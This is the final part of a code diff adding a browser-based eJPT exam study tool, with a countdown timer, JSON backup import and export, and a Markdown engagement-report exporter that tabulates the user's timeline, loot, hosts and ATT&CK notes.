+    state.targetHours = parseFloat(targetHoursInput.value) || 48;
+    document.getElementById('targetHoursLabel').textContent = state.targetHours;
+    scheduleSave();
+  });
+  document.getElementById('targetHoursLabel').textContent = state.targetHours;
+
+  document.getElementById('btnStartTimer').addEventListener('click', ()=>{
+    state.startTime = Date.now();
+    scheduleSave();
+  });
+  document.getElementById('btnClearTimer').addEventListener('click', ()=>{
+    state.startTime = null;
+    document.getElementById('elapsedVal').textContent = '00:00:00';
+    document.getElementById('remainVal').textContent = pad2(state.targetHours) + ':00:00';
+    scheduleSave();
+  });
+
+  function pad2(n){ return String(Math.floor(n)).padStart(2,'0'); }
+  function fmtHMS(totalSeconds){
+    const neg = totalSeconds < 0;
+    totalSeconds = Math.abs(Math.round(totalSeconds));
+    const h = Math.floor(totalSeconds/3600);
+    const m = Math.floor((totalSeconds%3600)/60);
+    const s = totalSeconds%60;
+    return (neg?'-':'') + String(h).padStart(2,'0')+':'+String(m).padStart(2,'0')+':'+String(s).padStart(2,'0');
+  }
+  function tickTimer(){
+    const paceVal = document.getElementById('paceVal');
+    const paceStat = document.getElementById('paceStat');
+    if(!state.startTime){
+      paceVal.textContent = '—';
+      paceStat.classList.remove('warn','critical');
+      return;
+    }
+    const elapsedSec = (Date.now() - state.startTime)/1000;
+    const remainSec = state.targetHours*3600 - elapsedSec;
+    document.getElementById('elapsedVal').textContent = fmtHMS(elapsedSec);
+    document.getElementById('remainVal').textContent = fmtHMS(remainSec);
+    const remainStat = document.getElementById('remainStat');
+    remainStat.classList.toggle('warn', remainSec > 60*60 && remainSec < 6*3600);
+    remainStat.classList.toggle('critical', remainSec > 0 && remainSec <= 60*60);
+    remainStat.classList.toggle('over', remainSec <= 0);
+
+    const openQuestions = state.questions.filter(q => !q.done).length;
+    if(openQuestions === 0){
+      paceVal.textContent = '✓ all done';
+      paceStat.classList.remove('warn','critical');
+    } else if(remainSec <= 0){
+      paceVal.textContent = '0m / q';
+      paceStat.classList.add('critical');
+    } else {
+      const minsPerQ = (remainSec/60) / openQuestions;
+      paceVal.textContent = (minsPerQ >= 100 ? Math.round(minsPerQ) : minsPerQ.toFixed(1)) + 'm / q';
+      paceStat.classList.toggle('warn', minsPerQ < 60 && minsPerQ >= 20);
+      paceStat.classList.toggle('critical', minsPerQ < 20);
+    }
+  }
+  setInterval(tickTimer, 1000);
+
+  // ---------- EXPORT / IMPORT ----------
+  function download(filename, content, mime){
+    const blob = new Blob([content], {type: mime});
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url; a.download = filename;
+    document.body.appendChild(a); a.click(); document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+  }
+
+  document.getElementById('btnExportJson').addEventListener('click', ()=>{
+    download('ejpt-study-reference-backup.json', JSON.stringify(state, null, 2), 'application/json');
+  });
+
+  document.getElementById('btnImport').addEventListener('click', ()=> document.getElementById('fileImport').click());
+  document.getElementById('fileImport').addEventListener('change', (e)=>{
+    const file = e.target.files[0];
+    if(!file) return;
+    const reader = new FileReader();
+    reader.onload = ()=>{
+      try{
+        const parsed = JSON.parse(reader.result);
+        state = Object.assign(defaultState(), parsed);
+        renderAll();
+        save();
+      }catch(err){ alert('Could not read that file — is it a JSON export from this reference tool?'); }
+    };
+    reader.readAsText(file);
+    e.target.value = '';
+  });
+
+  document.getElementById('btnReset').addEventListener('click', ()=>{
+    if(!confirm('Reset all tracked data? This cannot be undone (export JSON first if you want a backup).')) return;
+    state = defaultState();
+    renderAll();
+    save();
+  });
+
+  function mdEscape(s){ return (s||'').toString().replace(/\|/g,'\\|'); }
+
+  document.getElementById('btnExportMd').addEventListener('click', ()=>{
+    const lines = [];
+    lines.push('# eJPT Engagement Report — Draft');
+    lines.push('');
+    lines.push('*Auto-generated from eJPT Study Reference — fill in the executive summary and remediation recommendations before submitting.*');
+    lines.push('');
+    lines.push('## Executive Summary');
+    lines.push('');
+    lines.push('_[one or two sentences: scope, overall outcome, highest-impact finding]_');
+    lines.push('');
+    lines.push('## Questions / Flags');
+    lines.push('');
+    state.questions.forEach(q => {
+      const confTag = q.confidence ? ` _(confidence: ${mdEscape(q.confidence)})_` : '';
+      lines.push(`- [${q.done ? 'x' : ' '}] **${mdEscape(q.label)}**${confTag} — ${mdEscape(q.note) || '_no note_'}`);
+    });
+    lines.push('');
+    lines.push('## Attack Timeline');
+    lines.push('');
+    lines.push('| Timestamp | Host | Tool / Technique | Finding | ATT&CK / Notes |');
+    lines.push('|---|---|---|---|---|');
+    state.timeline.forEach(t => {
+      lines.push(`| ${mdEscape(t.time)} | ${mdEscape(t.host)} | ${mdEscape(t.tool)} | ${mdEscape(t.finding)} | ${mdEscape(t.attck)} |`);
+    });
+    lines.push('');
+    lines.push('## Credentials & Loot');
+    lines.push('');
+    lines.push('| Type | Value | Host / Service found on | Notes |');
+    lines.push('|---|---|---|---|');
+    state.loot.forEach(i => {
+      lines.push(`| ${mdEscape(i.type)} | ${mdEscape(i.value)} | ${mdEscape(i.hostService)} | ${mdEscape(i.notes)} |`);
+    });
+    lines.push('');
+    lines.push('## Host & Service Map');
+    lines.push('');
+    lines.push('| Host | Hostname / OS | Port / Service | Version / CVE | Status | Access Level | Notes |');
+    lines.push('|---|---|---|---|---|---|---|');
+    state.hosts.forEach(h => {
+      lines.push(`| ${mdEscape(h.host)} | ${mdEscape(h.hostnameOs)} | ${mdEscape(h.portService)} | ${mdEscape(h.versionCve)} | ${mdEscape(h.status)} | ${mdEscape(h.access)} | ${mdEscape(h.notes)} |`);
+    });
+    lines.push('');
+    lines.push('## MITRE ATT&CK Tactics Used');
+    lines.push('');
+    TACTICS.forEach(t => {
+      const e = state.attck[t];
+      if(e.observed) lines.push(`- **${t}**${e.technique ? ' — ' + mdEscape(e.technique) : ''}`);
+    });
+    lines.push('');
+    lines.push('## Attack Phase Status');
+    lines.push('');
+    PHASES.forEach(p => lines.push(`- ${p}: **${state.phases[p]}**`));
+    lines.push('');
+    lines.push('## Recommended Remediation');
+    lines.push('');
+    lines.push('_[patch versions, disable unused services, rotate exposed credentials, fix misconfigurations, etc.]_');
+    lines.push('');
+    lines.push('## Scratch Notes');
+    lines.push('');
+    lines.push(state.scratch || '_none_');
+    lines.push('');
+    download('ejpt-engagement-report-draft.md', lines.join('\n'), 'text/markdown');
+  });
+
+  // ---------- HELPERS ----------
+  function escapeHtml(s){ return (s||'').toString().replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[c])); }
+  function escapeAttr(s){ return (s||'').toString().replace(/"/g, '&quot;'); }
+
+  function renderAll(){
+    applyTheme();
+    renderQuestions();
+    lootRenderer.render();
+    timelineRenderer.render();
+    renderHosts();
+    renderAttck();
+    renderPhases();
+    renderCoverage();
+    scratchEl.value = state.scratch || '';
+    targetHoursInput.value = state.targetHours;
+    document.getElementById('targetHoursLabel').textContent = state.targetHours;
+    tickTimer();
+  }
+
+  renderAll();
+})();
+</script>
+</body>
+</html>
